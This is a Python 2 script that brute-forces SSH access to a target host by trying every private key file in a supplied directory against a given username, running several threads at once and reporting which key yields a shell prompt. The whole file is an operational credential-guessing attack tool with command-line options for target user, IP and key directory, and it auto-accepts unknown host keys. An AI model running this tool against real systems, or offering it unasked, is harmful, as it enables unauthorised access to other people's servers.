import pexpect
import optparse
import os
from threading import *

maxconn=5
conn_lock=BoundedSemaphore(value=maxconn)
stop=False
fails=0

def connect(user,tgtip,keyfile,release):
	global stop
	global fails
	try:
		perm_dnd='Permission Denied'
		ssh_msg='Are you sure you want to continue'
		ssh_cls='Connection closed by remote host'
		opt= '-o PasswordAuthentication=no'
		#con_str='ssh '+user+'@'+tgtip+' -i '+keyfile+' '+opt
		#child=pexpect.spawn(con_str)
		child=pexpect.spawn('ssh '+user+'@'+tgtip+' -i '+keyfile+' '+opt)
		
		ret=child.expect([pexpect.TIMEOUT,perm_dnd,ssh_msg,ssh_cls,'$','#'])
		if (ret==2):
			print "[!]Adding host to ~/.ssh/known_hosts "
			child.sendline('yes')
			connect(user,tgtip,keyfile,False)
		elif (ret==3):
			print "[-]"+str(ssh_cls)
			fails +=1
		elif (ret>3):
			print "[+]Success: "+str(keyfile)
			stop=True

	finally:
		if release:
			conn_lock.release()

def main():
	parser=optparse.OptionParser("Program Usage -U <target user_name> -H <target_ip> -K <directory of keys>")
	parser.add_option('-U',dest='user',type='string',help='specify target username')
	parser.add_option('-H',dest='tgtip',type='string',help='specify target ip address')
	parser.add_option('-K',dest='keydir',type='string',help='specify directory of key files')
	(options,args)=parser.parse_args()
	user=options.user
	tgtip=options.tgtip
	keydir=options.keydir
	if(user==None or tgtip==None or keydir==None):
		print parser.usage
		exit(0)
	for filename in os.listdir(keydir):
		if stop:
			print"[*]Existing key found[*]"
			exit(0)
		if fails>5:
			print "[!]Exiting:Too many connection closed by remote host[!]"
			print "[!]Adjust number of simultaneous threads[!]"
			exit(0)
		conn_lock.acquire()
		full_path=os.path.join(keydir,filename)
		print "[-]testing file"+str(full_path)
		t=Thread(target=connect,args=(user,tgtip,full_path,True))
		child=t.start() 
		#connect(user,tgtip,full_path,True)

if __name__=='__main__':
	main()		

